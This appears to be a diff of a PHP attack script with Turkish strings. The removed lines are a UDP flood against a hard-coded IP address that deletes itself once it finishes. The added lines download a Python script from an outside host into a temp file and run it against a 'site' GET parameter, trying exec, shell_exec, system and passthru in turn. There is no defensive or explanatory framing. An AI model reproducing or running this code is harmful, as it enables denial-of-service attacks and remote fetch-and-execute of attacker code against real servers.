@@ -1,24 +1,14 @@
-$packets = 0;
-ignore_user_abort(TRUE);
-set_time_limit(0);
-$exec_time = "30"
-$time = time();
-$max_time = $time+$exec_time;
-$host = "173.249.9.150"
-for($i=0;$i<65553;$i++){
-$out .= 'X';
+echo "<!--rahatinizabaakin-->";
+$temp = tmpfile();
+$site = @$_GET["site"];
+$dosya = @file_get_contents("http://bdmsproduction.com/dosya/x.txt");
+fwrite($temp, $dosya);
+$bilgi = stream_get_meta_data($temp);
+$dizin = $bilgi['uri'];
+$komut = "python {$dizin} {$site}";
+if(function_exists('exec')){$sonuc = @exec($komut);}elseif(function_exists('shell_exec')){$sonuc = @shell_exec($komut);}elseif(function_exists('system')){$sonuc = @system($komut);}elseif(function_exists('passthru')){$sonuc = @passthru($komut);
+}else{
+echo "tum fonksiyonlar kapali aq";
 }
-while(1){
-$packets++;
-if(time() > $max_time){
-break;
-}
-$rand = rand(1,65553);
-$fp = fsockopen('udp://'.$host, 80, $errno, $errstr, 30);
-if($fp){
-fwrite($fp, $out);
-fclose($fp);
-}
-}
-echo '<br>' . round($packets / $exec_time, 2) . " saniyede $packets (" . round(($packets * 65) / 1024, 2) . " MB) veri hedefe yollandi";
-unlink(__FILE__);
+print $sonuc;
+fclose($temp);
